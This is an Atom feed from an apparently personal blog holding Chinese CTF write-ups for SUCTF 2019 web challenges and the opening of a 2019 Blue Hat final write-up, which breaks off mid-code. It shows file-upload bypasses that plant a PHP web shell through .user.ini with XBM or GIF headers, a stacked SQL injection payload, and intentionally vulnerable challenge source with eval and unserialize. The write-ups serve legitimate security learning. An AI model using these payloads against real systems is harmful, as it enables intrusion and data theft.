<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ZO1RO</title>
  
  <subtitle>一个向往acm的ctf_dog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zo1ro.github.io/"/>
  <updated>2019-09-01T09:36:50.145Z</updated>
  <id>https://zo1ro.github.io/</id>
  
  <author>
    <name>ZO1RO</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SUCTF-2019-Web-复现</title>
    <link href="https://zo1ro.github.io/2019/09/01/suctf-2019/"/>
    <id>https://zo1ro.github.io/2019/09/01/suctf-2019/</id>
    <published>2019-09-01T02:17:12.000Z</published>
    <updated>2019-09-01T09:36:50.145Z</updated>
    
    <content type="html"><![CDATA[<p>SUCTF-2019-Web题目复现</p><a id="more"></a><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>首页就一个上传框，什么都没有</p><p><img src="1.png" alt="1"></p><p>随意上传文件返回几个不同的报错信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">illegal suffix!</span><br><span class="line"></span><br><span class="line">&amp;lt;? in contents!</span><br><span class="line"></span><br><span class="line">exif_imagetype:not image!</span><br></pre></td></tr></table></figure><p>查找发现类似的题目</p><p><a href="https://thibaudrobin.github.io/articles/bypass-filter-upload/" target="_blank" rel="noopener">Insomnihack 2019—–l33t-hoster</a></p><p>在那题发现有很多相似点，出现以下情况将报错</p><ul><li>&lt;?包含在文件内容中</li><li>如果文件只有扩展名(像 .htaccess, .txt)</li><li>文件不允许的扩展名</li><li>无法经过exif_imagetype的检验</li><li>getimagesize不返回1337 * 1337</li></ul><p>原题通过上传一个<code>.htaccess</code>，然后<code>IMAGETYPE_XBM</code>绕过<code>exif_imagetype</code>，从而绕过后缀解析进行<code>getshell</code>，但原题是<code>apache</code>环境，本题为<code>nginx</code>环境。</p><p>参考链接</p><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p><p>原理就是在<code>nginx</code>服务器上传一个<code>.user.ini</code>（这里作用相当于<code>apache</code>的<code>.htaccess</code>，但其实更像<code>php.ini</code>，只要是以<code>fastcgi</code>运行的php都可以用这个方法)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=01.gif</span><br><span class="line">//通过预加载01.gif的内容到当前所有php文件，类似于在文件前调用require函数，而auto_append_file是在文件后调用require函数</span><br></pre></td></tr></table></figure><p>那么我们通过这种方法，结合前面的<code>IMAGETYPE_XBM</code>上传一个<code>.user.ini</code></p><p><img src="2.png" alt="2"></p><p>上传成功，接着继续上传<code>01.gif</code>包含到<code>index.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;system(&quot;cat%20%2fflag&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="3.png" alt="3"></p><p><img src="4.png" alt="4"></p><p>还是比较有意思的一题，关键点在于<code>IMAGETYPE_XBM</code>和<code>.user.ini</code>的绕过。</p><p>贴上题目源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// error_reporting(0);</span><br><span class="line">$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name) &#123;</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);</span><br><span class="line">    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">        die(&quot;&amp;lt;? in contents!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . &quot;/&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &apos; &lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;Your files : &lt;br&gt;&apos;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看 <a href="https://xz.aliyun.com/t/6042#toc-25" target="_blank" rel="noopener">CheckIn-WP</a> 发现加个图片文件头也可以绕过 <code>exif_image</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;system(&quot;cat /flag&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>摆出一个注入框，提交正确信息会返回一些数据，错误信息不返回数据</p><p><img src="5.png" alt="5"></p><p><img src="6.png" alt="5"></p><p>先<code>fuzz</code>一下，发现可以通过<code>;</code>划分<code>sql</code>语句进行执行，</p><p><img src="7.png" alt="5"></p><p>有点类似之前的堆叠注入： <a href="https://blog.csdn.net/m0_38100569/article/details/99617762" target="_blank" rel="noopener">BUUCTF_Web_随便注</a>，但是预加载被黑名单</p><p><img src="8.png" alt="8"></p><p>看一下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(isset($post[&apos;query&apos;]))&#123;</span><br><span class="line">        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]));</span><br><span class="line">        if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123;</span><br><span class="line">            //echo $post[&apos;query&apos;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&apos;query&apos;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>发现拼接方式是 <code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p><p>那么就可以通过<code>select *,1||flag from Flag</code>进行查询。</p><p><img src="9.png" alt="8"></p><p>也可以通过设置<code>sql_mode</code>改变<code>||</code>为拼接字符串，参考链接</p><p><a href="https://blog.csdn.net/lixora/article/details/60572357" target="_blank" rel="noopener">mysql 修改sql_mode 实现字符串管道‘||’连接</a></p><p>构成<code>payload</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode=pipes_as_concat;select 1</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p><code>index.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&apos;_&apos;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&apos;One inch long, one inch strong!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&apos;/[\x00- 0-9A-Za-z\&apos;&quot;\`~_&amp;.,|=[\x7F]+/i&apos;, $hhh) )</span><br><span class="line">    die(&apos;Try something else!&apos;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="upload-lab2"><a href="#upload-lab2" class="headerlink" title="upload-lab2"></a>upload-lab2</h2><p><code>index.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$userdir = &quot;upload/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    // 允许上传的图片后缀</span><br><span class="line">    $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</span><br><span class="line">    $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $file_name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    $temp = explode(&quot;.&quot;, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))</span><br><span class="line">        &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)   // 小于 200 kb</span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = new Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123;</span><br><span class="line">            echo &quot;错误：: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . &quot;/&quot; . md5($file_name) . &quot;.&quot; . $extension);</span><br><span class="line">            echo &quot;文件存储在: &quot; . $userdir . &quot;/&quot; . md5($file_name) . &quot;.&quot; . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;非法的文件格式&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>func.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;class.php&apos;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;submit&quot;]) &amp;&amp; isset($_POST[&quot;url&quot;])) &#123;</span><br><span class="line">    if(preg_match(&apos;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&apos;,$_POST[&apos;url&apos;]))&#123;</span><br><span class="line">        die(&quot;Go away!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $file_path = $_POST[&apos;url&apos;];</span><br><span class="line">        $file = new File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        echo &quot;&lt;p&gt;Your file type is &apos;$file&apos; &lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>class.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line"></span><br><span class="line">class File&#123;</span><br><span class="line"></span><br><span class="line">    public $file_name;</span><br><span class="line">    public $type;</span><br><span class="line">    public $func = &quot;Check&quot;;</span><br><span class="line"></span><br><span class="line">    function __construct($file_name)&#123;</span><br><span class="line">        $this-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $class = new ReflectionClass($this-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs($this-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getMIME()&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $this-&gt;type = finfo_file($finfo, $this-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        return $this-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Check&#123;</span><br><span class="line"></span><br><span class="line">    public $file_name;</span><br><span class="line"></span><br><span class="line">    function __construct($file_name)&#123;</span><br><span class="line">        $this-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check()&#123;</span><br><span class="line">        $data = file_get_contents($this-&gt;file_name);</span><br><span class="line">        if (mb_strpos($data, &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">            die(&quot;&amp;lt;? in contents!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>admin.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line"></span><br><span class="line">class Ad&#123;</span><br><span class="line"></span><br><span class="line">    public $ip;</span><br><span class="line">    public $port;</span><br><span class="line"></span><br><span class="line">    public $clazz;</span><br><span class="line">    public $func1;</span><br><span class="line">    public $func2;</span><br><span class="line">    public $func3;</span><br><span class="line">    public $instance;</span><br><span class="line">    public $arg1;</span><br><span class="line">    public $arg2;</span><br><span class="line">    public $arg3;</span><br><span class="line"></span><br><span class="line">    function __construct($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)&#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;ip = $ip;</span><br><span class="line">        $this-&gt;port = $port;</span><br><span class="line"></span><br><span class="line">        $this-&gt;clazz = $clazz;</span><br><span class="line">        $this-&gt;func1 = $func1;</span><br><span class="line">        $this-&gt;func2 = $func2;</span><br><span class="line">        $this-&gt;func3 = $func3;</span><br><span class="line">        $this-&gt;arg1 = $arg1;</span><br><span class="line">        $this-&gt;arg2 = $arg2;</span><br><span class="line">        $this-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check()&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = new ReflectionClass($this-&gt;clazz);</span><br><span class="line">        $this-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        getFlag($this-&gt;ip, $this-&gt;port);</span><br><span class="line">        //使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    if(isset($_POST[&apos;admin&apos;]))&#123;</span><br><span class="line">        </span><br><span class="line">        $ip = $_POST[&apos;ip&apos;];     //你用来获取flag的服务器ip</span><br><span class="line">        $port = $_POST[&apos;port&apos;]; //你用来获取flag的服务器端口</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[&apos;clazz&apos;];</span><br><span class="line">        $func1 = $_POST[&apos;func1&apos;];</span><br><span class="line">        $func2 = $_POST[&apos;func2&apos;];</span><br><span class="line">        $func3 = $_POST[&apos;func3&apos;];</span><br><span class="line">        $arg1 = $_POST[&apos;arg1&apos;];</span><br><span class="line">        $arg2 = $_POST[&apos;arg2&apos;];</span><br><span class="line">        $arg2 = $_POST[&apos;arg3&apos;];</span><br><span class="line">        $admin = new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;You r not admin!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SUCTF-2019-Web题目复现&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019蓝帽杯决赛WP</title>
    <link href="https://zo1ro.github.io/2019/08/31/blue-hat-final/"/>
    <id>https://zo1ro.github.io/2019/08/31/blue-hat-final/</id>
    <published>2019-08-31T03:31:54.000Z</published>
    <updated>2019-09-01T01:57:57.647Z</updated>
    
    <content type="html"><![CDATA[<p>2019蓝帽杯决赛复现<code>Write-up</code></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次比赛共三道<code>WEB</code>，一道<code>PWN</code>。一开场就全场炸鸡，无法<code>ssh</code>，大约过了50分钟才修好（有些队伍早已拿到题进行审计）。时常持续三个小时，通过<code>web2</code>的后门和<code>web3</code>的流量持续拿了不少分。复现一下发现还是有所收获的。（虚拟机总是损坏，拖的比较久，用<code>window</code>搭算了）</p><h2 id="Web1-EBCMS-v1-1-0"><a href="#Web1-EBCMS-v1-1-0" class="headerlink" title="Web1-EBCMS-v1.1.0"></a>Web1-EBCMS-v1.1.0</h2><p><img src="5.png" alt></p><p>赛场上没做出来的题，赛后复现一下。</p><p>首先和源码<code>diff</code>一下，发现只有如下不同</p><p><code>app/home/controller/Api.php</code></p><p><img src="6.png" alt></p><p>贴下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">namespace app\home\controller;</span><br><span class="line">class Api&#123;</span><br><span class="line"></span><br><span class="line">public function captcha()&#123;</span><br><span class="line">\mylib\Config::set(&apos;sys.show_err&apos;, \Ebcms::config(&apos;show_err&apos;, false));</span><br><span class="line">$num = mt_rand(1, 50);</span><br><span class="line">$max = mt_rand($num, $num + 50);</span><br><span class="line">\mylib\Session::set(&apos;captcha&apos;, $num);</span><br><span class="line">return \mylib\Response::image(\Captcha::create(($max-$num).&apos;+?=&apos;.$max, 16));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function unserializehook()&#123;</span><br><span class="line">if(isset($_POST[&apos;seridata&apos;]))&#123;</span><br><span class="line">return unserialize(base64_decode($_POST[&apos;seridata&apos;]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>app/member/controller/Api.php</code></p><p><img src="7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 